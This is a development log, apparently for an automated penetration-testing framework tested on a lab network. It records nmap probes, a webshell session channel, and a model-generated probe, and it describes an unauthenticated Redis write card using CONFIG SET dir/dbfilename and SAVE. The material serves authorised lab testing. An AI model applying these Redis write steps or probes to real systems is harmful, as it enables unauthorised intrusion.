- 未含（随批次5补）：每张卡的真机正反例、跨配置用例与恢复检查；E3–E5 的四字段对齐不在本轮。

## 批次5 · 第 108–109 轮（2026-09-23）：桥 r107 最小修改落地 ＋ E2 实机复跑

**桥 r107（GPT6 ultra）裁定的最小修改，落地情况：**

1. Nmap 表标签与探测之分（`method`）：`assembly._xml_port_row` 读 `<service method="...">`——
   端口表标签（`method=table`）与探测出的服务类型（`method=probed`）共用 `service_label` 槽、
   由 `service_label_method` 分开；`checker._rule_service_matches_expected` 只采信 probed 那一条，
   表标签永不满足服务识别（文本形态按「同行有没有版本列」判 probed/unknown）。
   `service_label_method` 进 `EVIDENCE_FIELDS`（`pre.service_version` / `service_identity`）。
   规则表：`name+table`→仅标签；`name+probed` 无 product→探测出的服务类型；有 product 无 version→产品；
   product+version→两者；只有 version→保留版本观测、不反推产品。
2. 叶子形态要平台依据（`shape_needs_platform`）：`networkServiceInfo(...,local,...)` 与 `pathExists`
   两种只在单平台成立的形态，依据改从运行上下文的 `host_platforms`（`{"pc1": "windows", …}`）取；
   缺声明时**不硬映射**——occurrence 保留原槽位、记 `shape_needs_platform` 缺口继续跑（`retrieval.run`），
   E2 侧 `e2.declared_platforms` 从端点复制的 `inputs/context.json` 读同一份声明。
   `run_context` 契约新增该键（`bundle.CONTEXT_KEYS`），两份 hongri7 运行输入与两份模板已补；
   体检对未知族名报 warn。
3. 卡面诚实化：`pre.posix_path_access` 补「存在 vs 不可访问分开、结论只限本次检查、符号链接按解析对象、
   目标点落盘或起不了 Python 即缺口」与覆盖措辞（执行点缺少兼容 Python 3、或无法满足本卡权限检查语义时保持缺口）；
   `pre.credential_valid` 补 ssh 分支（`BatchMode=yes` 不提供口令认证、须排除默认密钥/agent/连接复用）
   与 netexec ssh 认证后继续探测的事实。
4. E3 与 E2 同构（第 109 轮）：`e3.action_item` 与 E2 同一分派——固定卡由程序给 item（零模型调用），
   模型卡把四字段回答经 `action_to_proposal` 过卡校验；`e3.run_action(…, context=…, kernel=…, raw_text=None)`；
   `scripts/run_e3_action.py` 的提示词与记录改走 `ModelSeam.generate_action`
   （记录 `model/model-<nnn>-generate_action.json`），不再自建提示词、不再绕过 seam。

**实机复跑（E2）**：`r113-e2e-node12` —— 与 r105 同一节点（node12 `networkServiceInfo(web1,redis,tcp,6379,root)`），
源 run `r113-src`（r103-src 的同一份材料、仅运行身份换新），端点 `e2-endpoint-r110`（新 bundle），
调用 `call-e2001-2e966cdba794`：`pre_satisfied`，三闸 `pass`（rule `service_matches_expected`）。
> 历史输出；只覆盖服务识别，原叶 root 条件未答，见第110轮更正。
步骤：`install --config output\e2-endpoint-r110.json --source-config output\e2-endpoint-r103.json` →
`run --source-run output\runs\r113-src --run-dir output\runs\r113-e2e-node12`。
两次复跑干扰如实留痕：`r111` 被端点登记拒收（同一 run 身份的同号调用已在共享 store 登记过，换新 run 身份即过）；
`r112` 一次供应商截断（completion_tokens=4000 顶格、无 content，属供应商毛刺），换身份重试即恢复。

**桥 r107 的验收清单（批次5门口，逐条落点）：**

1. 静态契约检查：判据名单一且装载期校验（`index_builder`）、参数/parser/证据/judge 对齐、7 张 model 卡 execution 完整、
   fixed 入口有效、执行路径都有确定超时 —— CI 第 3 格（`build_skill_index.py --check`）＋ `tests/test_skill_cards.py`。
2. 逐卡三态回放：`tests/test_assembly.py` / `tests/test_checker.py`；本轮新增 probed/table 正反例、
   `shape_needs_platform` 反例（`tests/test_runtime_retrieval.py`）。
3. 三条装配路径：tool_call / code / fixed —— `tests/test_runtime_e2.py`（fixed 零模型调用）、`tests/test_e2_dispatch.py`。
4. 公共异常与调用归属：marker/超时/错配用例（`tests/test_runtime_e2.py`、`tests/test_e2_dispatch.py`）。
5. 定向语义回归：withheld 零调用、认证不隐式重试、CIM owner 获取失败、Docker ID 不匹配、firewall 策略存储、
   POSIX 不可访问与不存在、SCM 仅 SMB —— 现有判据用例为准，逐条对表后补缺口（批次5）。
6. 恢复与回滚：kernel 恢复用例已有；整组卡文件回滚＋恢复演练未做，列批次5。

**本轮未含**：E3 真机链路（需要一条「固定动作卡 + 前置已满足」的链；node12 的动作卡为 null，E3 无卡可跑）、
每张 pre 卡的真机正负例、卡组回滚演练、会话注册信息补全 webshell 客户端（Q4a，仍按缺口处理）。

## 批次6 · 第 110 轮（2026-09-23）：桥 r108 诚实修正落地 ＋ r117 真机更正复跑

**桥 r108（GPT6 ultra）裁定的最小修改，落地情况（run109）：**

1. Nmap 槽位归一：`service_label_method` 只留 `table / probed / unknown`（XML 里其他 `method` 一律归 `unknown`）；
   文本形态只有在同行出现版本列时才算 `probed`——且先排除 `--reason` 的原因词（`syn-ack`、`conn-refused` 等）：
   原因词既不进 `service_version`，也不进 `service_banner`。`service_identity` 的 `EVIDENCE_FIELDS`
   补上此前漏掉的 `service_label_method`。
2. 平台与形态：`networkServiceInfo(...,local,...)` 只有在服务名属于已有进程映射（当前 `lsass`）且声明 `windows` 时才取
   `windows_process`，其他对象保持形态缺口；缺口措辞分两档——没声明时仍是 `shape_needs_platform`（请声明平台），
   已声明但本版本没有对应方法时明说「已声明 windows，本版本只有 POSIX 方法 / 该对象没有确认的进程映射，形态未覆盖」。
3. 卡面统一：`pre.posix_path_access` 的 `file_type` 统一为**解析后对象**的类型（取自 `stat`，样例改为
   `stat.S_ISDIR/S_ISREG` 派生），判据把「探针回报 symlink」从「不是目录」改判为「目标未分类」（uncertain）；
   `pre.credential_valid` 删掉未声明的 `smbclient` / `impacket-smbclient` 替代与自写 marker 模板，
   ssh 分支写清：`BatchMode=yes` 只禁提示、密钥路径须排除默认密钥/agent/复用、口令路径需要卡上声明的 `sshpass`
   入口（本卡未声明，缺则记缺口）。
4. 网络服务映射找回 `privilege`：`leaf_mapping.inputs_of` 的 `network_service` 形态补 `expected_privilege`；
   `checker.service_matches_expected` 原有的「有特权期望就必须有独立 owner 证据，否则 uncertain」从此真正接上。
5. E3 执行契约（同批）：端点收件矩阵放开 `model + action`（此前一律拒收，E3 模型卡实际跑不动）；
   `specs/008` 的 E3 一节改回四字段动作（tool_call / code / 缺口）＋ `pre_results` 输入行，E2 载荷句改为
   「model 调用（`pre` / `action` 两阶段）」；`e3.make_context` 把本次 run 已提交的 pre 结论投影成 `pre_results`
   （`leaf_ref / skill / status / reason`，去掉 call 管线与判据细节）进模型输入；`scripts/run_e3_action.py` 对
   「已请求但从未下发」的记录改为提示重建 run（保留记录作失败证据），不再一律提示 recover。
   测试：接收矩阵 model+action 正例与 post 反例、E3 模型卡正向派发（kind=model、phase=action 到派发）、
   fixed 卡 CLI 级 run/recover 零模型调用（模型入口被替换为「一碰就炸」）、恢复不重派发的计数断言、pre_results 投影用例。

**真机记录（E2 · node12 同叶 `networkServiceInfo(web1,redis,tcp,6379,root)`）**

- `r114-src` / `r114-e2e-node12`（端点 `e2-endpoint-r114`，新 bundle）：模型一次供应商截断
  （completion_tokens=4000 顶格、无 content）→ `not_executed` 如实留痕（与 r112 同款毛刺，非契约问题）。
- `r115-src` / `r115-e2e-node12`：`pre_satisfied`（三闸 pass）——但用的仍是**修正前的 E1 素材**
  （leaf inputs 无 `expected_privilege`，参数绑定因此没带上该要求）；结论只覆盖服务识别，不覆盖特权条件，
  照实记录为「素材滞后」件。
- `r117-src`（E1 素材用当前代码重生成，`expected_privilege=root` 进 inputs）/ `r117-e2e-node12`：
  freshness / target 两闸 pass，effect **uncertain**——
  `the leaf names a service identity; no independent service-owner evidence is carried`；run `status=stopped`（code 2）。
  这是特权要求绑定后的**诚实结论**：没有 web1 上 redis 进程 owner 的独立读据，服务识别再干净也不冒充原叶成立。
- 更正说明（历史）：`r105` / `r113` 的 `pre_satisfied` 同样缺这份特权绑定（当时 `inputs_of` 丢 `privilege`），
  两件的正确口径是「服务识别通过、原叶未全答」；更正常态由 r117 承载。

**r117 真机步骤**（可复现）：`install --config output\e2-endpoint-r114.json --source-config output\e2-endpoint-r110.json`
→（`r117-src` 由 `r103-src` 换身份复制，并用当前代码 `retrieval.run(node 12)` 重写 `e1.materials.json` / `retrieval.jsonl`）
→ `run --config output\e2-endpoint-r114.json --source-run output\runs\r117-src --run-dir output\runs\r117-e2e-node12 --model deepseek-flash --model-api-key-env AGV_MODEL_API_KEY`。

## 批次6 · 第 111 轮（2026-09-23）：node14 E3 真机＋recover（桥 r109 第 3 组）

**设计（桥 r109 Q3 裁定）**：第 3 组最小验收改走 **node14**（`RULE 1 (Direct Network Access)`，
`attacker→web1:6379`，impact `netAccess(web1,tcp,6379)`）：leaf15 与 action 均锁 `pre.nmap_tcp_probe`
（fixed 声明式卡，无需 `prepare_call/parse_call`），leaf16 `attackerLocated(attacker)` 为既有显式免检；
不复用 r117 的 node12 采用记录与旧 E2 结果，E1 材料用当前代码重生成。

- 源 run：`output/runs/b6-e3-node14-src`（由 r117-src 快照换身份重基；`planner.output.json`／`e1.input.json`／
  `pipeline.result.json` 对齐 node14＝14；`retrieval.jsonl` 重生成；`gaps=[]`）。
- 端点：`output/e2-endpoint-b6.json`（bundle `endpoint-1ca05fe4…ac0a0`，`install` 挂到同 instance
  `699c6532…063a` 后 `identified`）。
- **E2**：`output/runs/b6-e3-node14-e2e` → **`pre_satisfied`**（call `call-e2001-9c10b2f25757`，三闸 pass：
  freshness marker 在场；target 对齐；effect「the port answered open from the declared vantage」——本次
  vantage=attacker（kali）与叶要求一致）。零模型调用（无 `model.jsonl`）。
- **E3**（同目录、同 code／endpoint binding）→ **`collected`**（call `call-e3001-9980398c72ba`，rc=0、settled；
  请求 `kind=fixed`、`phase=action`、`files={}`，argv＝marker 包装的
  `nmap -Pn -n -sT --reason -p 6379 -oX - 192.168.52.10`；receipt 文件清单与 sha256 完整；
  **零 `generate_action` 调用**——fixed 卡程序直通）。
- **recover**：`e3-recovery-d170795daedb48dc835a9013ff51182d.json` → 同 call_id、`settled`、`observations=[]`；
  `calls.jsonl` 仍 2 行、digest `sha256:aaf1b702…c925` 不变；原请求/输出/回执不变、无新增 accept/execute。
- 「启动次数」验收（**桥 r110 Q3 更正口径**）：按 action call_id 计数＝1（`calls.jsonl`：pre／action 各一次）；
  `endpoint-snapshot-before.json` / `-after.json` 全量对比（文件集／内容 sha256／mtime／worker identity）
  ＝ **identical**（`endpoint-snapshot-diff.json`）；`worker.log` 由端点 `open("xb")` 结构性唯一。
  **未独立证明「一次启动」**：`calls.jsonl` 是投影、registry 单条 worker identity 均不足以证明「启动一次」；
  待「端点启动计数器」或「已有进程事件记录」二选一补证（与 node14 run＋recover 合并补），
  本台账只声明「未发现重复启动」。
- 证据文件：`output/runs/b6-e3-node14-e2e/{e2.result.json, e3.result.json, e3-recovery-*.json,
  endpoint-snapshot-{before,after,diff}.json, calls.jsonl}`。
- 复现步骤：`install --config output\e2-endpoint-b6.json --source-config output\e2-endpoint-r114.json` →
  `run --config output\e2-endpoint-b6.json --source-run output\runs\b6-e3-node14-src --run-dir output\runs\b6-e3-node14-e2e --model deepseek-flash --model-api-key-env AGV_MODEL_API_KEY` →
  `run_e3_action.py run --config output\e2-endpoint-b6.json --run-dir output\runs\b6-e3-node14-e2e` →
  `run_e3_action.py recover --config output\e2-endpoint-b6.json --run-dir output\runs\b6-e3-node14-e2e`。

## 批次6 · 第 112 轮（2026-09-23）：卡组回滚演练（桥 r109 Q5 第 4 组）

**演练对象**：8 张迁移卡＋索引/注册信息＋其必需的共享 parser/judge 改动（批次4–6 的
`src`/`skills`/`scripts`/`tests` 全部变更，共 37 文件）；回滚点＝批次4 前 `d69ab51`；
代表断点＝node14 E2 pre 调用（`call-e2001-9c10b2f25757`，digest `sha256:811e3cc3…`）。

**断点构造**（**桥 r110 Q4 更正措辞**：非「真实半程」，而是复用原已执行调用、构造控制端未收 receipt 的
恢复断点）：`output/runs/b6-rollback-node14` 从**已在 node14 真机执行过**的同一 `(run_id, call_id, digest)`
（`call-e2001-9c10b2f25757`）入手，走 run 初始化＋`intent`＋`accept`＋**`execute`（端点真执行）**，
随后停止、不 collect、不判定——端点已执行、控制端 kernel `receipt=None`（`acceptance` 在场）；
端点走幂等路径（未重启动）。

**四步验收**：

1. **旧版（`d69ab51`）**：`build_skill_index.py --check` = `index check: ok`（registry 32 skills）；
   `pytest tests/test_skill_cards.py tests/test_assembly.py` = **64 passed**（卡形态＋代表性判定回归）。
2. **新版（`0f9da27`）**：同两项 = `index check: ok` / **71 passed**。
3. **回滚后 recover（旧码）** → `recovery-001.json`：`status=stopped`、
   `ValueError: recovery requires the original code and endpoint binding`（`recovery_setup` 阶段拒绝）、
   `observations=[]`、`results=[]`；端点快照对比 **identical**（零新增业务执行）。
4. **恢复原版本 recover（新码）** → `recovery-002.json`：`pre_satisfied`、`blocked=false`；
   从端点**收回原调用**（observation `endpoint_status=executed`、digest/instance 与原记录一致、同 call_id）；
   端点快照对比 **identical**（无新增 accept/execute；「一次启动」按 Q3 更正口径＝尚未独立证明，见 r111 节）。

**语义依据**：`scripts/run_e2_pre.py` 的 `code_version()`（binding.code／endpoint 对比）＋
`src/runtime/e2_kernel.py` 的 `recover_call()`（`receipt` 空走 query+collect；`receipt` 在场走 verify）。
不增加卡版本层，不承诺跨版本续跑；symlink 不单独建机制（卡目录无 symlink 部署）。

**证据文件**：`output/runs/b6-rollback-node14/{recovery-001.json, recovery-002.json,
endpoint-snapshot-{before,after-reject,after-recover}.json, endpoint-snapshot-diff-{reject,recover}.json}`。

## 批次6 · 第 113 轮（2026-09-23）：前两张卡真机复验（桥 r109「逐卡真机」第 1–2 张）

**载体**：`output/diag/D60/model_run.py`（卡级真机直跑：模板/提案 → assembly → SSH 执行 → 同一条判定链），
录在 `output/runs/b6-card-live/`；控制机 kali `192.168.52.128`。
（这 8 张卡的缺口口径按桥裁定＝「迁移后尚未补齐真机正反例」；本轮先收前两张。）

1. **`pre.tool_present`（kali / POSIX）**
   - 正例：提案 `command -v nmap` → **pass**（`tool_path=/usr/bin/nmap`；freshness / target / effect 三闸 pass；
     原始 stdout `/usr/bin/nmap`）。call `call-20260923T020113-10b02e`；重跑同样 `exit=0`。
   - 负例（**桥 r110 Q2 更正＋r114 重跑销账**）：原 call `call-20260923T020132-a8c381` 的 `call.json`
     `returncode=0`——尾部 `echo …end` 覆盖了查询退出码，其 unsatisfied 依赖旧解析器「空观测直接 false」，
     负事实证据不足；**已修＋重跑**：`tool-absent-kali-rc/call-20260923T023659-1940ba` `returncode=127`
     （dash `command -v` 真实 rc、`tool_error=null`）→ evidence `tool_present=false` → **unsatisfied**。
2. **`pre.session_identity`**
   - 断连口径（真机）：会话引用＝D66 的 pc1 OA webshell 通道（目标当前不可达：`8080` 连接拒绝），
     探针 `echo <marker>user & whoami` → **uncertain**（freshness：marker 缺失——通道无回显；
     客户端真实 traceback 留档）。call `call-20260923T020241-b99fbc`。
   - 正例（正确会话读出身份）**待活会话补**：当前 kali `msfconsole -qx 'sessions -l'`＝无活动会话、
     pc1 OA 服务不可达；与桥裁定的「其余 pre 卡随会话供给主线补」同一依赖，届时一并收。


## 批次6 · 第 114 轮（2026-09-23）：桥 r110 落地——rc 语义修复＋tool_present 正负例重跑（Q1–Q5 第①步）

**修复（按桥 r110 Q1/Q2 的最小修改）**：
- `runtime.remote.SshExecutor`：rc=127 只在 **stdout 一个字节都没有**时判 `tool_error`；runtime 包装后的
  查询自身 rc=127（如 dash 的 `command -v`）保留为调用自己的退出码（真机重跑暴露的误伤）。
- `runtime.assembly._parse_tool_present()`：负例读数接受 `rc∈{1,127}`＋空 stdout（bash 为 1、dash 为 127）；
  别名／函数／空输出／未知错误保持缺值。`assembly.run()` 的 posix 分支改用 `adapter.marker_script()`
  包装，`probe_rc` 逃逸（替代尾部 echo 吞 rc 的旧路径）。
- 卡瘦身（Q5）：22 张卡删 `output.raw`／顶层 `notes`，6 张删空 `input.optional`，两张删死声明 `effect_rule`；
  schema 同步收紧。E2 汇总瘦身：`e2.result.json` 的 `results[]` 只留六键
  （`occurrence_ref/leaf_ref/skill/status/call_id/reason`），详细 judgement 留在各自 call 目录。

**真机重跑（kali 192.168.52.128，D60 卡级直跑）**：
- 正例 `tool-present-kali-rerun/call-20260923T023704-d07815`：rc=0、`/usr/bin/nmap` → **pass**（三闸 pass）。
- 负例 `tool-absent-kali-rc/call-20260923T023659-1940ba`：rc=127、`tool_error=null`、`tool_present=false`
  → **unsatisfied**（Q2 销账：负例携带自己的 rc 证据）。
- 历史 call `tool-absent-kali/call-20260923T020132-a8c381`（rc=0）为修复前身，不再作为负例证据。

**仍未决（承接桥 r110）**：启动计数独立证明（Q3）＝「端点启动计数器／进程事件记录」二选一（与 node14
run＋recover 合并补）；「执行点决定 `execution.tools` 入口」为 E2 DoD 剩余项。


## 批次6 · 第 115 轮（2026-09-23）：E2 收口批次（r122/r123）实机复跑——两形态闭环＋真实中断恢复＋派生状态不落库

**前提（源件全部用当前代码重生成）**：`r123-src-node14`／`r123-src-node14b`（由 `b6-e3-node14-src` 换身份重基）与
`r123-src-node12`（由 `r117-src` 重基）：图由 TXT＋主机映射＋资产重新投影（JSON sha256 与 b6 图一致），
E1 材料用当前 `retrieval.run_stage` 重生成——node14：leaf15 `hacl(attacker,web1,tcp,6379)`→`pre.nmap_tcp_probe`
（声明式直通，gaps=0）；node12：leaf17 `networkServiceInfo(web1,redis,tcp,6379,root)`→`pre.service_version`（模型卡）。
端点：`install --config output\e2-endpoint-r123.json --source-config output\e2-endpoint-b6.json` →
bundle `endpoint-68fa2064…44b6e` 挂同 instance `699c6532…063a`（`identified`）。

**① 直通形态（node14，零模型）**：`run --config output\e2-endpoint-r123.json --source-run output\runs\r123-src-node14
--run-dir output\runs\r123-e2e-node14` → **`pre_satisfied`**；call `call-e2001-2651b76555ff`；三闸 pass
（freshness、target、effect＝`directed_tcp_connect_matches`／「the port answered open from the declared vantage」）；
请求 `kind=fixed`、`files={}`、**无 `expected/binding/adopted_input` 三副本**；**无 `model.jsonl`**（一次模型调用都没有）。

**② 模型形态（node12，一次模型）**：同配置 `--source-run output\runs\r123-src-node12 --run-dir output\runs\r123-e2e-node12`：
模型一次给出四字段动作（`tool_call` 形态，参数占位符由程序绑定），实机 call `call-e2001-11ceb1aca7b7`
（rc=0、6.68s、vantage `kali@192.168.52.128`）；freshness/target 两闸 pass，effect **uncertain**——
`the leaf names a service identity; no independent service-owner evidence is carried`（叶带 `expected_privilege=root`；
与 r117 同一诚实结论）→ run `stopped`（exit 2）。模型计量：1 次调用、latency 8218ms、prompt 1440 / completion 1850（`model.jsonl`）。

**③ 真实中断恢复（node14b）**：`r123-src-node14b` 新身份 → 新 call `call-e2001-0b07bed5c078`；控制器在端点 call 目录
出现后 **46ms** 被终止（`call.json` 尚未出现＝真飞行中），端点 worker 独立跑完；`recover` → **`pre_satisfied`**
（`recovery-001.json`：observation `endpoint_status=executed`、instance/digest 一致、`diagnostics=[]`）。端点侧独立证据：`dirs 12→13`、`worker.log 12→13`，**恢复前后独占启动记录数量 13→13 保持不变**——结合唯一启动权、
工作进程单次领取与恢复仅补取原结果的实现，验收「恢复不重打」；**文件数量不作为原始尝试次数**（被拒绝的重复尝试与
独占创建后的进程创建失败都不新增文件）。call 目录恢复前后一致性引用 `interrupt-report.json` 的 `call_dir_stable` 汇总
（`listing_same`/`hashes_same`；本轮只留汇总与一份清单，未独立保留前后两份原始快照）；控制端 `receipt` 恢复前为空、
恢复后在场。

**④ 派生状态不落库（live 证据）**：探针 call `call-e2001-probe01`（确定性 argv）：`accept`（请求不带三副本，端点照收）→
`execute` 回执 `status=executed, state=result_ready`，而端点 DB 行 `state=claimed`（**结果状态只推导、不落库**）；
`query` 仍回 `result_ready`；`settle` 后 DB `state=settled`；全库状态分布 `settled|14`（不存在 `result_ready`／`unknown` 持久值）。

**证据文件**：`output/runs/r123-e2e-node14/`、`output/runs/r123-e2e-node12/`、
`output/runs/r123-e2e-node14b/{recovery-001.json,interrupt-report.json}`、`output/e2-endpoint-r123.json`。


## 批次6 · 第 116 轮（2026-09-23）：可移植最小验收——部署目录/启动工作目录更换后无需改卡或源码

**本地断言**：`tests/test_e2_dispatch.py::test_a_moved_deploy_keeps_the_direct_loop`。打包 pyz → 部署
`deploy-a/registry` → `init` → 整包 `shutil.move` 到 `deploy-b`（断言旧目录不存在）→ 从第三工作目录
`elsewhere/` 启动同一份代码、`--root` 指向新存储：identity→accept→execute→query→settle 全链通过
（`state=result_ready`、回执 sha 一致、`settle=settled`、确定性直通只执行一次 `launches==["started"]`）；
`call.json` 的 artifacts 全在新根下；调用目录任一文件不含 `deploy-a` 字节。

**实机（kali 192.168.52.128）**：
- 新配置 `output/e2-endpoint-r125-moved.json`：初装 remote-root `/home/kali/agv-e2-moved-r125`
  （bundle `1e289d5e…f3a8`、instance `e13a979ecc6444018f8f87185463024a`、`status=initialized`）。
- 整目录 `mv` → `/home/kali/agv-e2-moved2-r125`（旧地址确认不存在）；配置就地改 bundle/store 指向 moved2。
- 从第三工作目录 `C:\Users\50506` 发起：`run --config output\e2-endpoint-r125-moved.json
  --source-run output\runs\r123-src-node14 --run-dir output\runs\r125-move-node14` → **`pre_satisfied`**（rc 0）。
- 证据：`binding.code.git=41a3d32…`、`binding.endpoint` 指向 moved2；call `call-e2001-2651b76555ff`
  （与 r123 同 id＝重放，argv 走契约 argv ＋ `sh -c` marker 包装）；三闸 freshness/target/effect 全 pass
  （`every gate passed (freshness, target, effect); rule: directed_tcp_connect_matches`）；无 `model.jsonl`（零模型）；
  `endpoint.call.json` 三条 artifacts 全在 `/home/kali/agv-e2-moved2-r125/registry/calls/7c601731…/…`；
  端点 registry 下只有本次调用目录与 `registry.sqlite3`。

**支持范围**：换部署目录、换启动工作目录后无需改卡、无需改源码——端点按本次调用的路径绑定工作，
控制器每次连接都用 SFTP 校验 bundle sha（本次整包搬家后 bundle 未变，仍是同一份代码）。
证据文件：`output/runs/r125-move-node14/`、`output/e2-endpoint-r125-moved.json`。


## 批次6 · 第 117 轮（2026-09-23）：E3 继承验收——当前代码一条真实 E3 闭环＋一张实施卡签卡侧契约

**本地断言（桥 r115 Q4 第 2 步）**——`tests/test_runtime_e2.py`：
- `test_e3_uses_frozen_action_and_recovers_without_verdict`：E3 实际派发请求（fixed 与 model 两面）
  均不含 `expected`/`binding`/`adopted_input` 三副本；
- `test_a_frozen_old_request_recomputes_to_its_recorded_digest`：固定向量——b6 批次 E3 动作请求原文
  （`output/runs/b6-e3-node14-e2e/call-e3001-9980398c72ba/request.json`，含当时的三副本字段）
  由现算法重算得到其存储摘要 `sha256:aaf1b702…c925`（两端一起漂移时互相比对发现不了的洞，由此钉住）。

**卡侧契约迁移（第 3 步）**：`exploit.redis_unauth_write` 签 `prepare_call`/`parse_call`（继
`pre.impacket_scm_query` 之后首张实施卡）：整条固定 SET→GET（可选 `CONFIG SET dir/dbfilename`→`SAVE`→`DEL`）
装进一个密封 argv，每步以 `<标签>=<原始输出>` 行落在共享调用标记块内；脚本以 GET 步的 rc 退出；
`parse_call` 只从这些行读出 `write_accepted` / `readback_value` / 可选 `cleanup_deleted`（本地 `run()` 不动）。
单元往返：`tests/test_runtime_e2.py::RealCardFaceTests::test_redis_unauth_write_face_round_trip`
（argv 只回三键、无 `files`；缺块＝空读数、不产生判决）。

**实机（kali 192.168.52.128）**：
- **E3 闭环（node14，当前代码）**：源 run `r123-src-node14` → 新 run 目录 `output/runs/r126-e3-node14`
  （端点 `output/e2-endpoint-r123.json`、instance `699c6532…`）：
  ① E2 pre → `pre_satisfied`（call `call-e2001-2651b76555ff`，三闸 pass，零模型）；
  ② E3 → **`collected`**（call `call-e3001-8fdaf66b0dc9`，rc=0、receipt 七件套 sha256 完整、settlement settled、
  **verdict 为空**——动作不带叶判决；请求无三副本）；
  ③ `recover` → `e3-recovery-8e30a56eb14a45db80895fc3fb0c8fb4.json` → 同 call_id、settled、`observations=[]`；
  `calls.jsonl` 仍 2 行（pre／action 各一次），无新增 accept/execute。
- **卡面实机（redis）**：`prepare_call` 产出的密封 argv 原样送 kali 执行 → rc=0；标记块内
  `set=OK` / `get=hello-r126` / `cleanup=1`；`parse_call` 读出
  `write_accepted=true, readback_value=hello-r126, cleanup_deleted=true`（证据件
  `output/runs/r126-redis-face/{script.sh,stdout.txt,evidence.json}`）。清理步已执行，靶场键不留存。

**仍未决（承接桥 r115）**：redis 卡在 E3 里的实机派发要等 node12 前置成立——leaf17 `networkServiceInfo(
web1,redis,tcp,6379,root)` 的属主证据缺口（诚实不确定）未补前，`allowed(action)` 依契约拒绝；
本轮的 E3 实机闭环以 node14 声明式卡完成，redis 卡只声明「卡面契约＋真机命中原样 argv」。


## 批次6 · 第 118 轮（2026-09-23）：E2 收口声明——桥 r115 判据两项均已落地（当前代码 6b72878 两形态复跑）

**判据来源**：桥 r115 收口评定给出「可宣布 E2 已完成」的两个条件——①E2 卡契约与方法正文收齐（作者契约、
模板校验与十张事前卡一致；进程名带／不带后缀指向同一查询对象）；②补齐已支持执行环境的最小可移植验收
（换部署目录＋启动工作目录后无需改卡或源码）。两项均已落地：①＝r125 `41a3d32`；②＝r125b `833a804` 断言＋
kali 换位实机（本文件「第 116 轮」）。

**收口账单（逐项—证据）**：

| 目标项 | 证据 |
| --- | --- |
| 极简卡样式＝md＋脚本＋必要 schema | 32 张卡＝`SKILL.md`＋`skill.json`（＋按需 `entry.py`）；契约 `docs/product/skill_contract.md`、规格 `specs/002-generic-skill-methods/spec.md`；守线 `tests/test_skill_cards.py`（尾段真可选）、`tests/test_skill_catalog.py`（索引与注册表双向一致） |
| fixed 直通 | 声明式 1 张（`pre.nmap_tcp_probe`：`run.command`＋`parse`）＋脚本面 2 张已签 `prepare_call`/`parse_call`（`pre.impacket_scm_query`、`exploit.redis_unauth_write`）；实机（当前代码）：`output/runs/r126-e3-node14` 的 pre 调用 `call-e2001-2651b76555ff` ＝ `pre_satisfied`、零模型 |
| 模型四字段动作包（tool_call／code） | `tests/test_runtime_e2.py::ModelFaceTests`（tool_call／code／解释器三例）；实机（当前代码）：`output/runs/r127-e2-node12c`——模型一次 tool_call（`nmap -Pn -n -sT -sV --reason -p 6379 -oX - 192.168.52.10`）→ 派发 `call-e2001-8598efed5ddc`、rc=0、receipt 七件套；freshness／target pass，effect 诚实 uncertain（`the leaf names a service identity; no independent service-owner evidence is carried`）→ stopped |
| Kali 端执行代理收件 | `src/runtime/e2_dispatch.py`（init／identity／accept／execute／query／settle、请求摘要、收据 sha、worker 独占启动）；实机 instance `699c6532…`（本批三跑）与 `e13a979e…`（换位） |
| model 卡 execution 声明＋`pre.service_version` | 11 张 model 卡均声明 `output`；pre 线可锁的 8 张 model 卡全部带 `execution`（`tools` 或 `entry`＋`interpreters`）；`pre.service_version` 当前代码实机闭环见上一行 |
| IO 简洁＋程序通用（不绑靶场） | 材料四键、参数只 `name`/`value`、请求无三副本（r122）；可移植断言 `tests/test_e2_dispatch.py::test_a_moved_deploy_keeps_the_direct_loop`＋换位实机（第 116 轮） |
| 全绿并提交 | 当前树 pytest **1178 passed／1 skipped**、CI **4/4**（`output/reports/ci/6b72878.json`） |

**本批复跑记录（当前代码 6b72878）**：
1. fixed 形态：`output/runs/r126-e3-node14` → `pre_satisfied`（call `call-e2001-2651b76555ff`；三闸 pass；零模型）。
2. model 形态：`output/runs/r127-e2-node12c`（重基源 run `r127-src-node12`，新身份）→ `stopped`（诚实）：
   `model.jsonl`＝1 次调用、latency 6343ms、prompt 1440／completion 1354；call `call-e2001-8598efed5ddc`、rc=0；
   freshness／target pass，effect uncertain（服务属主证据缺口）→ 停止。请求无三副本、`kind=model`、`phase=pre`。
3. 诚实边角：同日一次模型空答（`output/runs/r127-e2-node12b/model.jsonl`：completion 4000、
   `the model returned no content`）被判 `not_executed`——零派发、未烧调用身份，原文留档。

**诚实未决（不阻塞 E2 收口，已登记）**：node12 leaf17 的服务属主证据缺口（桥 r115 Q1 判定
「判定不确定、执行结果明确」＝验收通过）；redis 卡在 E3 的实机派发等该证据成立（第 117 轮已记）；
`skill_contract.md §10` 旧 CLI 口径为可选整洁项。


## 批次6 · 第 119 轮（2026-09-23）：IO 协议目录 P–E2 全量换真件＋新增 a→b→c 链路说明

**背景**：`IO协议/` 是项目方维护的 P–E2 单据集，上次交付在第 100 轮（E2 展示件落码）；
文件至今仍是 r94 时代旧稿——含已删字段（`score`/`skill_path`/`expected`/`binding`）、
三字段旧动作与两个旧节点案例。本轮按当前代码与真实 run 全量更新，并补一份三层链路说明。

**交付**（`IO协议/`，13 个文件，全 UTF-8 无 BOM、LF）：
- `P1P2i.json` / `P1P2o.json`：规划器六字段输入／三字段输出，取 `output/runs/r96-src/` 真件；
- `E1i.json` / `E1o.json`：E1 输入（规划输出＋`run_id`）与输出 a（材料），
  取 `output/runs/r127-src-node12/`（E2 模型形态使用的同一源 run）；
- `E2i.json` / `E2o1.json` / `E2o1.display.json` / `E2o2.json`：取 model 形态真 run
  `output/runs/r127-e2-node12c/`——模型问题＝`prompt` 输入段；模型输出＝`reply.text`
  四字段动作包；展示件＝`execution_view` 用 request／call 原件渲染；输出 c＝`e2.result.json` 原文；
- `E3i.json` / `E3o.json` / `E4i.json` / `E4o.json`：当前协议形状——E3 四字段动作（与 E2 同协议）；
  E4 输出仍为迁移前三字段 items（`src/runtime/proposal.py` 注明保留给 E4／E5 迁移前）；
  字段值取 r123／r126 真件，未整合处如实标注；
- 新增 `P-E2-IO链路.md`（三层）：①输入 a → 程序 → 输出 a（E1 检索）；②输出 a → 模型输入 b →
  模型输出 b（投影 v3＋四字段动作包；fixed 直通、`{name}` 占位符仅程序绑定）；③输出 b →
  程序校验 → 输出 c（封存→派发→回执→包裹→三闸 judgement→`e2.result.json`；含两本账）。
